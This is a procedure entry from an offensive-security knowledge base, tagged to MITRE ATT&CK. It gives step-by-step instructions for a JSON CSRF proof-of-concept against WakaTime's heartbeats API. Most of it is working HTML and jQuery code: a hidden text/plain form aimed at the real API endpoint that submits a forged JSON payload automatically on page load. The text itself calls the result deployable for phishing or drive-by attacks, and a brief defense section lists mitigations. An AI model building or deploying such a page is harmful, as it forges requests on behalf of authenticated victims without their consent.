---
id: proc-wakatime-craft-poc-001
tags:
  - csrf
  - html
  - poc
type: procedure
tools:
  - '[[tools/jQuery]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:20.781Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft JSON CSRF POC HTML

## Summary

This procedure creates a proof-of-concept HTML page that uses a form with text/plain encoding to forge a JSON request to WakaTime's Heartbeats API, exploiting the lack of content-type validation.

## Description

Targeted at web environments where victims are authenticated to WakaTime, this involves building a malicious page that dynamically constructs a valid JSON heartbeat payload in a hidden form input. The form submits automatically on load, leveraging the victim's cookies to authenticate the request. Prerequisites: Knowledge of the target JSON schema (e.g., entity, type, project fields); outcome is a deployable HTML file for phishing or drive-by attacks.

## Requirements

1. Text editor for HTML/JS
2. [[tools/jQuery]] library (via CDN)
3. Valid JSON structure from API recon (e.g., {"write":true,"project":"Test","language":"Python","timestamp":Math.floor(Date.now()/1000)})

## Defense

Defensive measures and detection strategies:

- Validate Origin/Referer headers on API requests
- Use SameSite=Strict cookies to prevent cross-site submission
- Log and alert on heartbeat requests from non-standard user-agents

## Objectives

1. Construct valid forged JSON payload
2. Embed in text/plain form for CSRF bypass
3. Enable auto-submission via JavaScript

## Instructions

### Step 1: Set Up HTML Structure

**Context**: Create the base form pointing to the vulnerable endpoint with text/plain enctype.

```html
<!DOCTYPE html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
</head>
<body>
    <form id="csrf-form" action="https://api.wakatime.com/api/v1/users/current/heartbeats" method="POST" enctype="text/plain">
        <input type="hidden" name="" value="" id="payload">
    </form>
</body>
</html>
```

> This form will send the body as text/plain, which the server parses as JSON.

### Step 2: Dynamically Build and Submit Payload

**Context**: Use jQuery to set the input name/value as JSON and auto-submit.

Add this script before </body>:

```javascript
$(document).ready(function() {
    var jsonPayload = '{"write":true,"project":"FakeProject","language":"Python","timestamp":' + Math.floor(Date.now() / 1000) + '}';
    $('#payload').attr('name', ''); // Empty name for raw body
    $('#payload').val(jsonPayload);
    $('#csrf-form').submit();
});
```

> Adjust jsonPayload to match required fields; submission occurs on load if victim is authenticated.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/jQuery]]

## Tags

- [[csrf]]
- [[poc]]
